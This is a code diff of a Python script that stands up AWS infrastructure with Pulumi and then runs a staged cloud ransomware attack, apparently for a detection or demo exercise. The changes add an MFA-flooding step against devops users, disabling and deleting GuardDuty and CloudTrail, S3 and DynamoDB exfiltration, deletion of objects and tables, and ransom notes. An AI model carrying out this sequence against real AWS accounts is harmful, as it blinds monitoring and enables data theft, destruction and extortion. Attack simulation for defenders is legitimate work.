@@ -2,6 +2,8 @@ import os
 import subprocess
 import json
 import time
+import random
+import string
 from tqdm import tqdm
 from time import sleep
 from termcolor import colored
@@ -14,21 +16,26 @@ import pulumi_aws as aws
 import boto3
 from attack import Attack
 from MFA import MFASetup
+from Load_Pulumi_Outputs import get_pulumi_output
 from ransomware import Ransomware
 
 
-# Initialize AWS Clients
+# Initialize AWS Clients 
 iam_client = boto3.client("iam")
 sts_client = boto3.client("sts")
 
 PULUMI_OUTPUT_PATH = "/workspaces/Pulumi/Infra/forrester-2025-output.json"
 
-# Define user and initial MFA ARN (this may be empty initially)
-user = "DevopsUser"
-mfa_arn = ""
+# # Dynamically fetching DevopsUser from Pulumi Outputs
+# #user = "DevopsUser"
+# user_arn = get_pulumi_output("devops_user_arn")
+# user = user_arn.split("/")[-1]  # Extracts the username
+# print(f"DEBUG: Extracted IAM Username: {user}") 
 
-# Create MFASetup instance with required parameters
-mfa = MFASetup(user, mfa_arn, iam_client, sts_client, PULUMI_OUTPUT_PATH)
+# mfa_arn = ""
+
+# #Create MFASetup instance with required parameters
+# mfa = MFASetup(user, mfa_arn, iam_client, sts_client, PULUMI_OUTPUT_PATH)
 
 
 
@@ -157,6 +164,7 @@ def ensure_pulumi_deployment():
 if __name__ == "__main__":
     # print("Starting Infrastructure Deployment...")
 
+    time.sleep(300)
 
     print("\n\n\n") 
     print("Executing Pulumi Deployment...")
@@ -177,7 +185,32 @@ if __name__ == "__main__":
     print("\n\n\n") 
     print("Setting up MFA for DevOpsUser and getting a session token")
     print("\n\n\n")
+    # Dynamically fetching DevopsUser from Pulumi Outputs
+    user_arn = get_pulumi_output("devops_user_arn")
+    user = user_arn.split("/")[-1]  # Extracts the username
+    print(f"DEBUG: Extracted IAM Username: {user}") 
+
+    mfa_arn = ""
+
+    #Create MFASetup instance with required parameters
+    mfa = MFASetup(user, mfa_arn, iam_client, sts_client, PULUMI_OUTPUT_PATH)
     mfa.setup_mfa_and_login()
+
+
+    # devops_users = ["DevopsDeploy", "DevopsAutomation", "DevopsMonitor", "DevopsPipeline", "DevopsUser"]
+    
+    # # Loop through all DevOps users and setup MFA for each
+    # for user in devops_users:
+    #     mfa_arn = get_pulumi_output(f"{user}_mfa_arn")  # Fetch MFA ARN dynamically
+    #     if "ERROR" in mfa_arn:
+    #         print(f"Skipping {user}, no MFA ARN found.")
+    #         continue  # Skip user if MFA ARN is not found
+        
+    #     print(f"\n\n🚀 Setting up MFA and retrieving a session token for {user}...\n\n")
+    #     mfa = MFASetup(user, mfa_arn, iam_client, sts_client, get_pulumi_output)
+    #     mfa.setup_mfa_and_login()
+
+
 
 #   _____                            _    _               
 #  |  __ \                          | |  | |              
@@ -202,7 +235,12 @@ if __name__ == "__main__":
     ### &  attaching AWS s3/Dynamodb all access policies
     ### for exfiltration --> deletion --> ransomware note
     #####################################################
-    user_name = "run_while_u_can"
+
+    def generate_unique_username(base_name="run_while_u_can", length=6):
+        random_suffix = ''.join(random.choices(string.digits, k=length))
+        return f"{base_name}_{random_suffix}"
+    
+    user_name = generate_unique_username()
     ransomware_access_keys = attack.createuser_attatchpolicies.run_pipeline(
         username=user_name,
         policy_arns=[
@@ -234,16 +272,49 @@ if __name__ == "__main__":
     ransomware = Ransomware(access_key,secret_key)
     ransomware.session_test()
 
+    ransomware.devops_team_MFA_DDOS()
+    Functions.attack_execution_duration(seconds=30, description="Do MFA DDOS on devops team and wait 30 seconds")
+
     ransomware.disable_guardduty()
+    ransomware.delete_guardduty()
+    Functions.attack_execution_duration(seconds=30, description="Disable & Delete Guard duty then wait 30 seconds")
+
     ransomware.stop_cloudtrail_logging()
-
-
-    ransomware.s3_drain.search_and_exfiltrate()
-
-
-    ransomware.dynamodb_drain.search_and_exfiltrate()
+    ransomware.delete_cloudtrail()
+    Functions.attack_execution_duration(seconds=30, description="Disable & Delete Cloudtrail then wait 30 seconds")
 
 
 
+#      ____    _  _   _           _   
+#   __|__ /   /_\| |_| |_ __ _ __| |__
+#  (_-<|_ \  / _ \  _|  _/ _` / _| / /
+#  /__/___/ /_/ \_\__|\__\__,_\__|_\_\
+    # ransomware.s3_drain.search_and_exfiltrate()
+    # Functions.attack_execution_duration(seconds=30, description="s3 Drain then wait 30 seconds")
 
+    ransomware.s3_drain.exfiltrate()
+    Functions.attack_execution_duration(seconds=15, description="s3 Exfil then wait 15 sec...")
+    ransomware.s3_drain.delete_objects()
+    Functions.attack_execution_duration(seconds=15, description="s3 Delete then wait 15 sec...")
+    ransomware.s3_drain.place_ransom_note()
+
+    ### Pause between s3 & DynamoDB to generate chronological alerts for CRISP story telling ###
+    Functions.attack_execution_duration(seconds=30, description="s3 Attack vector finished... waiting 30 sec to commence DynamoDB vector")
+
+#   ___                           ___  ___     _  _   _           _   
+#  |   \ _  _ _ _  __ _ _ __  ___|   \| _ )   /_\| |_| |_ __ _ __| |__
+#  | |) | || | ' \/ _` | '  \/ _ \ |) | _ \  / _ \  _|  _/ _` / _| / /
+#  |___/ \_, |_||_\__,_|_|_|_\___/___/|___/ /_/ \_\__|\__\__,_\__|_\_\
+#        |__/                                                         
+    #ransomware.dynamodb_drain.search_and_exfiltrate()
+    ransomware.dynamodb_drain.exfiltrate()
+    Functions.attack_execution_duration(seconds=15, description="DynamoDB Exfil then wait 15 sec...")
+
+    ransomware.dynamodb_drain.delete_tables()
+    Functions.attack_execution_duration(seconds=15, description="DynamoDB Delete Tables then wait 15 sec...")
+
+    ransomware.dynamodb_drain.create_ransom_table()
+    Functions.attack_execution_duration(seconds=15, description="DynamoDB Create Ransom Table then wait 15 sec...")
+
+    ransomware.dynamodb_drain.insert_ransom_note()
 
